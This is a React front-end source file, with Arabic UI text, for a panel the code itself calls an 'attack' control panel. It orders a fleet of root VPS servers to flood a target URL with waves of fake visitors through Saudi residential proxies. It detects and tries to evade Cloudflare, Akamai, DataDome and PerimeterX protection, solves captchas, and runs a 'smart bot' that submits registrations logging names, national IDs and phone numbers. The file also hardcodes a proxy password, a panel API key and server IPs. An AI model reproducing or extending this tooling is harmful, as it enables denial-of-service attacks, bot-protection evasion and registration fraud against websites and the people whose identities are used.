'use client';
import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [url, setUrl] = useState('');
  const [durationMin, setDurationMin] = useState('5');
  const [waveSize, setWaveSize] = useState('200');
  const [stayTime, setStayTime] = useState('35');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeAction, setActiveAction] = useState('');
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [showServerPanel, setShowServerPanel] = useState(false);

  // Server version check for cache busting
  const CURRENT_SERVER_VERSION = 'v15-smart-fix';
  const [servers, setServers] = useState(() => {
    if (typeof window !== 'undefined') {
      const savedVersion = localStorage.getItem('serverVersion');
      if (savedVersion === CURRENT_SERVER_VERSION) {
        const saved = localStorage.getItem('servers');
        if (saved) try { return JSON.parse(saved); } catch(e) {}
      }
      localStorage.setItem('serverVersion', CURRENT_SERVER_VERSION);
    }
    return [
      { host: '138.68.141.40', username: 'root' },
      { host: '144.126.234.13', username: 'root' },
      { host: '46.101.52.177', username: 'root' },
      { host: '142.93.41.217', username: 'root' },
      { host: '167.99.94.250', username: 'root' },
      { host: '165.22.118.138', username: 'root' },
      { host: '138.68.177.243', username: 'root' },
      { host: '167.172.61.206', username: 'root' },
      { host: '46.101.87.130', username: 'root' }
    ];
  });
  const [newHost, setNewHost] = useState('');
  const [showApiKey, setShowApiKey] = useState(false);
  const [newUsername, setNewUsername] = useState('root');
  const [useProxy, setUseProxy] = useState(true);
  const [proxyHost, setProxyHost] = useState('proxy.packetstream.io');
  const [proxyPort, setProxyPort] = useState('31112');
  const [proxyUser, setProxyUser] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('proxyUser') || 'fanar';
    return 'fanar';
  });
  const [proxyPass, setProxyPass] = useState(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('proxyPass');
      if (saved && saved.includes('RlM')) {
        const fixed = saved.replace('RlM', 'RIM');
        localStorage.setItem('proxyPass', fixed);
        return fixed;
      }
      if (saved && !saved.includes('_country-')) {
        const fixed2 = saved + '_country-SaudiArabia';
        localStorage.setItem('proxyPass', fixed2);
        return fixed2;
      }
      return saved || 'j7HGTQiRnys66RIM_country-SaudiArabia';
    }
    return 'j7HGTQiRnys66RIM_country-SaudiArabia';
  });
  const [monitoring, setMonitoring] = useState(false);
  const [serverStatus, setServerStatus] = useState([]);
  const [attackStartTime, setAttackStartTime] = useState(null);
  const [remainingSeconds, setRemainingSeconds] = useState(null);
  const [attackSummary, setAttackSummary] = useState(null);
  const [scanResult, setScanResult] = useState(null);
  const [scanning, setScanning] = useState(false);
  const [socketUrl, setSocketUrl] = useState('');
  const [captchaApiKey, setCaptchaApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaApiKey') || '';
    return '';
  });
  const [captchaService, setCaptchaService] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaService') || '2captcha';
    return '2captcha';
  });
  const [proxyStatus, setProxyStatus] = useState(null);
  const [phase, setPhase] = useState('idle');
  const intervalRef = useRef(null);
  const countdownRef = useRef(null);
  const [panelApiKey, setPanelApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('panelApiKey') || 'Fadi@Attack2026!SecureKey#X9';
    return 'Fadi@Attack2026!SecureKey#X9';
  });

  // ===== SMART BOT MODE =====
  const [mode, setMode] = useState('attack'); // 'attack' or 'smart'
  const [sesInstances, setSesInstances] = useState('3');
  const [sesDuration, setSesDuration] = useState('10');
  const [sesPhase, setSesPhase] = useState('idle'); // idle, deploying, running, finished
  const [sesStatus, setSesStatus] = useState([]);
  const [sesRecent, setSesRecent] = useState([]);
  const [sesMonitoring, setSesMonitoring] = useState(false);
  const sesIntervalRef = useRef(null);
  const sesCountdownRef = useRef(null);
  const [sesStartTime, setSesStartTime] = useState(null);
  const [sesRemaining, setSesRemaining] = useState(null);
  const [smartUrl, setSmartUrl] = useState('');

  // Persist
  useEffect(() => { if (panelApiKey) localStorage.setItem('panelApiKey', panelApiKey); }, [panelApiKey]);
  useEffect(() => { localStorage.setItem('captchaApiKey', captchaApiKey); }, [captchaApiKey]);
  useEffect(() => { localStorage.setItem('proxyUser', proxyUser); }, [proxyUser]);
  useEffect(() => { localStorage.setItem('proxyPass', proxyPass); }, [proxyPass]);
  useEffect(() => { localStorage.setItem('captchaService', captchaService); }, [captchaService]);
  useEffect(() => { localStorage.setItem('servers', JSON.stringify(servers)); }, [servers]);

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  // Proxy check
  const checkProxy = async () => {
    setProxyStatus('checking');
    try {
      const res = await fetch('/api/proxy-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass })
      });
      const data = await res.json();
      setProxyStatus(data.status);
      if (data.status === 'expired') addLog('⚠️ البروكسي منتهي');
      else if (data.status === 'active') addLog('✅ البروكسي شغال');
      else addLog(`⚠️ حالة البروكسي: ${data.message || data.status}`);
    } catch(e) {
      setProxyStatus('error');
      addLog('❌ فشل فحص البروكسي');
    }
  };

  useEffect(() => {
    if (useProxy && proxyHost && proxyUser && proxyPass) checkProxy();
  }, []);
  useEffect(() => {
    if (useProxy && proxyHost && proxyUser && proxyPass) checkProxy();
  }, [useProxy, proxyHost, proxyUser, proxyPass]);

  // Dynamic calculations
  const ws = parseInt(waveSize) || 200;
  const calcTotalVisits = (min) => (parseInt(min) || 0) * ws * 2 * servers.length;
  const calcTotalWaves = (min) => (parseInt(min) || 0) * 2;
  const totalVisitsEstimate = calcTotalVisits(durationMin);
  const totalWaves = calcTotalWaves(durationMin);
  const activeVisitorsEstimate = ws * servers.length;

  const formatDuration = (seconds) => {
    if (seconds <= 0) return '0 ثانية';
    if (seconds < 60) return `${seconds} ثانية`;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return secs === 0 ? `${mins} دقيقة` : `${mins} دقيقة و ${secs} ثانية`;
  };

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = Math.round(seconds % 60);
    return `${m}:${String(s).padStart(2, '0')}`;
  };

  // Countdown
  useEffect(() => {
    if (attackStartTime && monitoring) {
      const totalDurationMs = parseInt(durationMin) * 60 * 1000;
      const updateCountdown = () => {
        const elapsed = Date.now() - attackStartTime;
        const remaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));
        setRemainingSeconds(remaining);
        if (remaining <= 0) setPhase('finished');
      };
      updateCountdown();
      countdownRef.current = setInterval(updateCountdown, 1000);
      return () => clearInterval(countdownRef.current);
    }
  }, [attackStartTime, monitoring, durationMin]);

  // Sesallameh countdown
  useEffect(() => {
    if (sesStartTime && sesMonitoring) {
      const totalDurationMs = parseInt(sesDuration) * 60 * 1000;
      const updateCountdown = () => {
        const elapsed = Date.now() - sesStartTime;
        const remaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));
        setSesRemaining(remaining);
        if (remaining <= 0) setSesPhase('finished');
      };
      updateCountdown();
      sesCountdownRef.current = setInterval(updateCountdown, 1000);
      return () => clearInterval(sesCountdownRef.current);
    }
  }, [sesStartTime, sesMonitoring, sesDuration]);

  // Check if all servers finished
  useEffect(() => {
    if (attackStartTime && monitoring && serverStatus.length > 0) {
      const activeServers = serverStatus.filter(s => s.status === 'running' || s.status === 'starting');
      const finishedServers = serverStatus.filter(s => s.status === 'finished');
      if (activeServers.length === 0 && finishedServers.length > 0) {
        setRemainingSeconds(0);
        setPhase('finished');
      }
    }
  }, [serverStatus, attackStartTime, monitoring]);

  // Fetch status
  const fetchStatus = async () => {
    try {
      const res = await fetch('/api/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ servers })
      });
      const data = await res.json();
      if (data.results) {
        const filtered = data.results.map(s => {
          if (s.status === 'finished' && !attackStartTime) return { ...s, status: 'idle', visits: 0, target: 0, progress: 0, elapsed: 0, errors: 0 };
          if (s.timestamp && attackStartTime && (s.timestamp * 1000) < attackStartTime) return { ...s, status: 'starting', visits: 0, target: ws * totalWaves, progress: 0, elapsed: 0, errors: 0 };
          return s;
        });
        setServerStatus(filtered);
        const activeServers = filtered.filter(s => s.status === 'running');
        const finishedServers = filtered.filter(s => s.status === 'finished');
        if (activeServers.length > 0) setPhase('running');
        if (activeServers.length === 0 && finishedServers.length > 0) {
          stopMonitoring();
          setPhase('finished');
          const sumVisits = filtered.reduce((sum, s) => sum + (s.visits || 0), 0);
          const sumErrors = filtered.reduce((sum, s) => sum + (s.errors || 0), 0);
          const maxElapsed = Math.max(...filtered.map(s => s.elapsed || 0), 0);
          const totalRate = maxElapsed > 0 ? Math.round((sumVisits / maxElapsed) * 60) : 0;
          const totalActive = filtered.reduce((sum, s) => sum + (s.active_visitors || 0), 0);
          const peakActive = Math.max(...filtered.map(s => s.peak_active || 0), 0);
          const sumVerified = filtered.reduce((sum, s) => sum + (s.verified_visitors || 0), 0);
          const sumBlocked = filtered.reduce((sum, s) => sum + (s.blocked_visitors || 0), 0);
          const peakVerified = Math.max(...filtered.map(s => s.peak_verified || 0), 0);
          setAttackSummary({ target: totalVisitsEstimate, visits: sumVisits, errors: sumErrors, elapsed: maxElapsed, rate: totalRate, activeVisitors: totalActive, peakActive, verifiedVisitors: sumVerified, blockedVisitors: sumBlocked, peakVerified });
          addLog(`✅ انتهت جميع العمليات | ${sumVisits} زيارة | ✅ ${sumVerified} متحقق | 🚫 ${sumBlocked} محظور | ${sumErrors} خطأ | ${formatTime(maxElapsed)} | ${totalRate}/دقيقة`);
        }
      }
    } catch (err) {}
  };

  const startMonitoring = () => { setMonitoring(true); fetchStatus(); intervalRef.current = setInterval(fetchStatus, 15000); };
  const stopMonitoring = () => { setMonitoring(false); if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; } };
  useEffect(() => { return () => { if (intervalRef.current) clearInterval(intervalRef.current); }; }, []);

  // Sesallameh status fetch
  const fetchSesStatus = async () => {
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'status-smart', servers })
      });
      const data = await res.json();
      if (data.results) {
        setSesStatus(data.results);
        // Collect all recent entries from all servers
        const allRecent = [];
        data.results.forEach(sv => {
          if (sv.recent && sv.recent.length > 0) {
            sv.recent.forEach(entry => {
              allRecent.push({ ...entry, server: sv.host });
            });
          }
        });
        // Sort by id descending and keep latest 30
        allRecent.sort((a, b) => (b.id || 0) - (a.id || 0));
        if (allRecent.length > 0) setSesRecent(allRecent.slice(0, 30));
        
        // Log new entries
        const prevCount = sesRecent.length;
        if (allRecent.length > prevCount && prevCount > 0) {
          const newEntries = allRecent.slice(0, allRecent.length - prevCount);
          newEntries.forEach(e => {
            addLog(`📋 تسجيل #${e.id} | ${e.name} | ${e.national_id} | ${e.phone} | ${e.server}`);
          });
        }
        
        const running = data.results.filter(s => s.status === 'running');
        const stopped = data.results.filter(s => s.status === 'stopped');
        if (running.length > 0) setSesPhase('running');
        if (running.length === 0 && stopped.length > 0 && sesPhase === 'running') {
          setSesPhase('finished');
          stopSesMonitoring();
          const totalBookings = data.results.reduce((sum, s) => sum + (s.bookings || 0), 0);
          const totalErrors = data.results.reduce((sum, s) => sum + (s.errors || 0), 0);
          addLog(`✅ انتهى البوت الذكي | ${totalBookings} تسجيل ناجح | ${totalErrors} خطأ`);
        }
      }
    } catch (err) {}
  };

  const startSesMonitoring = () => { setSesMonitoring(true); fetchSesStatus(); sesIntervalRef.current = setInterval(fetchSesStatus, 10000); };
  const stopSesMonitoring = () => { setSesMonitoring(false); if (sesIntervalRef.current) { clearInterval(sesIntervalRef.current); sesIntervalRef.current = null; } };
  useEffect(() => { return () => { if (sesIntervalRef.current) clearInterval(sesIntervalRef.current); }; }, []);

  // Auto-fetch smart bot status when switching to smart mode
  useEffect(() => {
    if (mode === 'smart') {
      fetchSesStatus();
    }
  }, [mode]);

  const addServer = () => {
    if (!newHost) return addLog('❌ الرجاء إدخال عنوان IP');
    if (servers.find(s => s.host === newHost)) return addLog('❌ السيرفر موجود');
    setServers(prev => [...prev, { host: newHost, username: newUsername || 'root' }]);
    addLog(`✅ تمت إضافة: ${newHost}`);
    setNewHost(''); setNewUsername('root');
  };

  const removeServer = (host) => {
    setServers(prev => prev.filter(s => s.host !== host));
    addLog(`🗑️ تم حذف: ${host}`);
  };

  const buildProxyList = () => {
    if (!useProxy || !proxyUser || !proxyPass) return [];
    return [{ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass }];
  };

  // ===== MAIN ACTION: One-click Start (scan + start) =====
  const handleStart = async () => {
    if (!url) return addLog('❌ ادخل الرابط أولاً');
    if (!/^https?:\/\//i.test(url)) return addLog('❌ الرابط لازم يبدأ بـ http:// أو https://');
    if (servers.length === 0) return addLog('❌ لا يوجد سيرفرات');

    setLoading(true);
    setActiveAction('start');
    setScanResult(null);
    setServerStatus([]);
    setAttackStartTime(null);
    setRemainingSeconds(null);
    setAttackSummary(null);
    stopMonitoring();

    setPhase('scanning');
    addLog(`🔍 جاري فحص ${url} تلقائياً...`);
    
    let detectedScanResult = null;
    try {
      addLog(`🔍 فحص ذكي من السيرفر...`);
      const scanRes = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ url, proxies: buildProxyList() })
      });
      const scanData = await scanRes.json();
      if (scanData.scanResult) {
        detectedScanResult = scanData.scanResult;
        if (detectedScanResult.has_socketio && detectedScanResult.socket_url) {
          addLog(`✅ تم اكتشاف Socket.IO: ${detectedScanResult.socket_url}`);
        }
        addLog(`✅ فحص ذكي: الوضع ${detectedScanResult.mode} | الحماية: ${detectedScanResult.protection || 'none'}`);
      } else {
        addLog(`🔄 فحص بديل من VPS...`);
        const scanRes2 = await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
          body: JSON.stringify({ action: 'scan', url, servers, proxies: buildProxyList() })
        });
        const scanData2 = await scanRes2.json();
        if (scanData2.scanResult) detectedScanResult = scanData2.scanResult;
      }
      
      if (detectedScanResult) {
        setScanResult(detectedScanResult);
        const modeNames = { socketio: '🔌 Socket.IO', cloudflare: '☁️ Cloudflare', browser: '🌐 متصفح حقيقي', http: '🌐 HTTP مباشر' };
        const protNames = { cloudflare: 'Cloudflare', akamai: 'Akamai', datadome: 'DataDome', perimeterx: 'PerimeterX', none: 'لا يوجد' };
        addLog(`✅ الحماية: ${protNames[detectedScanResult.protection] || detectedScanResult.protection || 'غير معروف'} | الوضع: ${modeNames[detectedScanResult.mode] || detectedScanResult.mode}`);
      } else {
        addLog(`⚠️ فشل الفحص - سيتم استخدام الوضع التلقائي`);
      }
    } catch(e) {
      addLog(`⚠️ خطأ في الفحص: ${e.message} - سيتم المتابعة`);
    }

    setPhase('starting');
    addLog(`🚀 جاري بدء الهجوم على ${servers.length} سيرفرات...`);
    addLog(`📊 المدة: ${durationMin} دقيقة | الموجة: ${waveSize} زائر | البقاء: ${stayTime}ث | 👥 ~${activeVisitorsEstimate} نشط`);

    try {
      let effectiveSocketUrl = socketUrl || undefined;
      if (!effectiveSocketUrl && detectedScanResult?.socket_url && detectedScanResult?.mode === 'socketio') {
        effectiveSocketUrl = detectedScanResult.socket_url;
      }
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({
          action: 'start', url,
          durationMin: parseInt(durationMin),
          waveSize: parseInt(waveSize),
          stayTime: parseInt(stayTime),
          servers,
          proxies: buildProxyList(),
          socketUrl: effectiveSocketUrl,
          captchaApiKey: captchaApiKey || undefined,
          captchaService: captchaService || undefined,
          forceMode: detectedScanResult?.mode || undefined,
          forceProtection: detectedScanResult?.protection || undefined
        })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`❌ ${data.error}`);
        setPhase('idle');
      } else {
        let successCount = 0;
        data.results.forEach(r => {
          if (r.status === 'success') { successCount++; addLog(`✅ ${r.host}: ${r.output || 'تم'}`); }
          else addLog(`❌ ${r.host}: ${r.error}`);
        });
        if (successCount > 0) {
          setPhase('running');
          setAttackStartTime(Date.now());
          setRemainingSeconds(parseInt(durationMin) * 60);
          addLog(`⚡ تم البدء على ${successCount}/${servers.length} سيرفرات`);
          setTimeout(startMonitoring, 8000);
        } else {
          addLog('❌ فشل البدء على جميع السيرفرات');
          setPhase('idle');
        }
      }
    } catch (err) {
      addLog(`❌ خطأ: ${err.message}`);
      setPhase('idle');
    }
    setLoading(false);
    setActiveAction('');
  };

  // Stop
  const handleStop = async () => {
    setLoading(true);
    setActiveAction('stop');
    addLog('⏹️ جاري إيقاف الهجوم...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'stop', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: تم الإيقاف` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    stopMonitoring();
    setServerStatus([]);
    setAttackStartTime(null);
    setRemainingSeconds(null);
    setPhase('idle');
    setLoading(false);
    setActiveAction('');
  };

  // Setup servers
  const handleSetup = async () => {
    setLoading(true);
    addLog('⚙️ جاري تجهيز السيرفرات...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'setup', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false);
  };

  // Deploy script
  const handleDeploy = async () => {
    setLoading(true);
    addLog('📤 جاري رفع السكريبت...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'deploy', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false);
  };

  // ===== SESALLAMEH ACTIONS =====
  const handleDeploySes = async () => {
    setLoading(true);
    addLog('📤 جاري رفع سكريبت البوت الذكي...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'deploy-smart', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false);
  };

  const handleStartSes = async () => {
    if (servers.length === 0) return addLog('❌ لا يوجد سيرفرات');
    if (!smartUrl || !/^https?:\/\//i.test(smartUrl)) return addLog('❌ ادخل رابط صحيح');
    setLoading(true);
    setSesPhase('deploying');
    addLog('📤 جاري رفع البوت الذكي...');

    // Auto-deploy first
    try {
      const deployRes = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'deploy-smart', servers })
      });
      const deployData = await deployRes.json();
      if (deployData.results) {
        const deployed = deployData.results.filter(r => r.status === 'success').length;
        addLog(`✅ تم رفع السكريبت على ${deployed}/${servers.length} سيرفرات`);
      }
    } catch(e) {
      addLog(`⚠️ خطأ في الرفع: ${e.message}`);
    }

    // Start the bot
    addLog(`🚀 جاري بدء البوت الذكي على ${servers.length} سيرفرات | ${smartUrl} | ${sesDuration} دقيقة | ${sesInstances} متصفحات`);
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({
          action: 'start-smart',
          url: smartUrl,
          durationMin: parseInt(sesDuration),
          instances: parseInt(sesInstances),
          servers,
          proxies: buildProxyList()
        })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`❌ ${data.error}`);
        setSesPhase('idle');
      } else {
        let successCount = 0;
        data.results.forEach(r => {
          if (r.status === 'success') { successCount++; addLog(`✅ ${r.host}: ${r.output || 'تم'}`); }
          else addLog(`❌ ${r.host}: ${r.error}`);
        });
        if (successCount > 0) {
          setSesPhase('running');
          setSesStartTime(Date.now());
          setSesRemaining(parseInt(sesDuration) * 60);
          addLog(`⚡ البوت الذكي شغال على ${successCount}/${servers.length} سيرفرات`);
          setTimeout(startSesMonitoring, 5000);
        } else {
          addLog('❌ فشل البدء');
          setSesPhase('idle');
        }
      }
    } catch (err) {
      addLog(`❌ خطأ: ${err.message}`);
      setSesPhase('idle');
    }
    setLoading(false);
  };

  const handleStopSes = async () => {
    setLoading(true);
    addLog('⏹️ جاري إيقاف البوت الذكي...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'stop-smart', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(`✅ ${r.host}: ${r.output || 'تم الإيقاف'}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    stopSesMonitoring();
    setSesStatus([]);
    setSesStartTime(null);
    setSesRemaining(null);
    setSesPhase('idle');
    setLoading(false);
  };

  const getStatusColor = (s) => ({ running:'#22c55e', starting:'#facc15', finished:'#3b82f6', idle:'#6b7280', offline:'#ef4444' }[s] || '#6b7280');
  const getStatusText = (s) => ({ running:'🟢 شغال', starting:'🟡 يبدأ...', finished:'🔵 انتهى', idle:'⚪ خامل', offline:'🔴 غير متصل' }[s] || '⚪');
  const getModeText = (m) => ({ socketio:'🔌 SOCKET', cloudflare:'☁️ FLARE', browser:'🌐 BROWSER', http:'🌐 HTTP' }[m] || m || '');
  const getModeColor = (m) => ({ socketio:'#06b6d4', cloudflare:'#f97316', browser:'#a855f7', http:'#22c55e' }[m] || '#6b7280');

  const ff = "'Courier New', 'Noto Sans Arabic', 'Segoe UI', Tahoma, monospace";
  const st = {
    page: { minHeight:'100vh', backgroundColor:'#000', color:'#22c55e', padding:'24px', fontFamily:ff, direction:'rtl' },
    box: { maxWidth:'850px', margin:'0 auto', border:'1px solid #166534', padding:'24px', borderRadius:'12px', backgroundColor:'#111827' },
    title: { fontSize:'26px', fontWeight:'bold', marginBottom:'20px', textAlign:'center', borderBottom:'1px solid #166534', paddingBottom:'12px', color:'#22c55e' },
    input: { width:'100%', backgroundColor:'#000', border:'1px solid #166534', padding:'10px 12px', borderRadius:'6px', color:'#fff', fontSize:'14px', fontFamily:ff, outline:'none', boxSizing:'border-box' },
    label: { display:'block', marginBottom:'6px', fontSize:'13px', color:'#22c55e' },
    btn: (bg) => ({ display:'flex', alignItems:'center', justifyContent:'center', gap:'6px', backgroundColor:bg, color:'#fff', padding:'14px 8px', borderRadius:'8px', cursor:'pointer', border:'none', fontSize:'14px', fontFamily:ff, transition:'opacity 0.2s', fontWeight:'bold' }),
    card: { backgroundColor:'#111827', border:'1px solid #1f2937', borderRadius:'8px', padding:'14px', marginBottom:'10px' },
    badge: (c) => ({ fontSize:'11px', padding:'2px 8px', borderRadius:'12px', color:c, border:`1px solid ${c}`, fontFamily:ff }),
  };

  const totalVisits = serverStatus.reduce((sum, x) => sum + (x.visits || 0), 0);
  const totalErrors = serverStatus.reduce((sum, x) => sum + (x.errors || 0), 0);
  const totalActiveVisitors = serverStatus.reduce((sum, x) => sum + (x.active_visitors || 0), 0);
  const totalVerifiedVisitors = serverStatus.reduce((sum, x) => sum + (x.verified_visitors || 0), 0);
  const totalBlockedVisitors = serverStatus.reduce((sum, x) => sum + (x.blocked_visitors || 0), 0);

  const phaseText = { idle: '⚪ جاهز', scanning: '🔍 يفحص الموقع...', starting: '🚀 يبدأ الهجوم...', running: '⚡ شغال', finished: '✅ انتهى' };
  const phaseColor = { idle: '#6b7280', scanning: '#facc15', starting: '#f97316', running: '#22c55e', finished: '#3b82f6' };

  const sesPhaseText = { idle: '⚪ جاهز', deploying: '📤 يرفع البوت...', running: '🧠 البوت الذكي شغال...', finished: '✅ انتهى' };
  const sesPhaseColor = { idle: '#6b7280', deploying: '#facc15', running: '#f97316', finished: '#3b82f6' };

  const totalSesBookings = sesStatus.reduce((sum, s) => sum + (s.bookings || 0), 0);
  const totalSesErrors = sesStatus.reduce((sum, s) => sum + (s.errors || 0), 0);

  return (
    <div style={st.page}>
      <div style={st.box}>
        <h1 style={st.title}>⚔️ لوحة التحكم v14</h1>

        {/* Mode Switcher */}
        <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'8px', marginBottom:'16px' }}>
          <button
            onClick={() => setMode('attack')}
            style={{
              ...st.btn(mode === 'attack' ? '#16a34a' : '#374151'),
              padding:'12px',
              fontSize:'15px',
              border: mode === 'attack' ? '2px solid #22c55e' : '2px solid #374151'
            }}
          >
            ⚔️ هجوم زوار
          </button>
          <button
            onClick={() => setMode('smart')}
            style={{
              ...st.btn(mode === 'smart' ? '#f97316' : '#374151'),
              padding:'12px',
              fontSize:'15px',
              border: mode === 'smart' ? '2px solid #f97316' : '2px solid #374151'
            }}
          >
            🧠 بوت ذكي
          </button>
        </div>

        {/* ===== ATTACK MODE ===== */}
        {mode === 'attack' && (
          <>
            {/* Phase indicator */}
            <div style={{ textAlign:'center', marginBottom:'16px', padding:'8px', backgroundColor:'#0a0a0a', borderRadius:'8px', border:`1px solid ${phaseColor[phase]}` }}>
              <span style={{ fontSize:'16px', color: phaseColor[phase], fontWeight:'bold' }}>{phaseText[phase]}</span>
              {phase === 'running' && <span style={{ fontSize:'12px', color:'#9ca3af', marginRight:'10px' }}> | 🖥️ {servers.length} سيرفرات | 👥 ~{activeVisitorsEstimate} نشط</span>}
            </div>

            <div style={{ marginBottom:'16px' }}>
              <label style={st.label}>🔗 رابط الموقع المستهدف</label>
              <input type="text" value={url} onChange={(e) => { setUrl(e.target.value); setScanResult(null); }} placeholder="https://example.com" style={{...st.input, fontSize:'16px', padding:'14px'}} disabled={phase === 'running' || phase === 'scanning' || phase === 'starting'} />
            </div>

            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'12px', marginBottom:'16px' }}>
              <div>
                <label style={st.label}>⏱️ المدة (دقائق)</label>
                <input type="number" value={durationMin} onChange={(e) => setDurationMin(e.target.value)} min="1" style={{...st.input, textAlign:'center', fontSize:'16px'}} disabled={phase === 'running'} />
              </div>
              <div style={{ display:'flex', alignItems:'end' }}>
                <div style={{ width:'100%', textAlign:'center', padding:'12px', backgroundColor:'#0a1628', borderRadius:'8px', border:'1px solid #1e3a5f' }}>
                  <div style={{ fontSize:'20px', fontWeight:'bold', color:'#06b6d4' }}>👥 {activeVisitorsEstimate.toLocaleString()}</div>
                  <div style={{ fontSize:'10px', color:'#6b7280' }}>زائر نشط دائماً</div>
                </div>
              </div>
            </div>

            {/* Proxy */}
            <div style={{ marginBottom:'14px', border:'1px solid #166534', borderRadius:'8px', padding:'14px', backgroundColor:'#0a0a0a' }}>
              <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:'10px' }}>
                <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
                  <span style={{ fontSize:'13px', color:'#22c55e' }}>🌐 بروكسي سعودي</span>
                  <button onClick={() => setUseProxy(!useProxy)} style={{ background: useProxy ? '#22c55e' : '#374151', color:'#fff', border:'none', padding:'3px 14px', borderRadius:'12px', cursor:'pointer', fontSize:'11px', fontFamily:ff }}>
                    {useProxy ? '✅ مفعّل' : '❌ معطّل'}
                  </button>
                </div>
                {useProxy && proxyStatus === 'active' && <span style={{ background:'#052e16', color:'#4ade80', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #22c55e' }}>✅ البروكسي شغال</span>}
                {useProxy && proxyStatus === 'expired' && <span style={{ background:'#450a0a', color:'#fca5a5', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #dc2626' }}>❌ الرصيد خلص!</span>}
                {useProxy && proxyStatus === 'checking' && <span style={{ background:'#1a1a2e', color:'#facc15', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #facc15' }}>⏳ يفحص...</span>}
              </div>
              {useProxy && (
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'8px' }}>
                  <div>
                    <label style={{ fontSize:'11px', color:'#6b7280', marginBottom:'4px', display:'block' }}>Username</label>
                    <input type="text" value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} placeholder="اسم المستخدم" style={st.input} />
                  </div>
                  <div>
                    <label style={{ fontSize:'11px', color:'#6b7280', marginBottom:'4px', display:'block' }}>Password</label>
                    <input type="text" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} placeholder="كلمة المرور" style={st.input} />
                  </div>
                </div>
              )}
            </div>

            {/* Start / Stop */}
            <div style={{ display:'grid', gridTemplateColumns: phase === 'running' ? '1fr 1fr' : '1fr', gap:'10px', marginBottom:'16px' }}>
              {phase !== 'running' && (
                <button onClick={handleStart} disabled={loading || phase === 'scanning' || phase === 'starting'} style={{...st.btn('#16a34a'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'18px'}}>
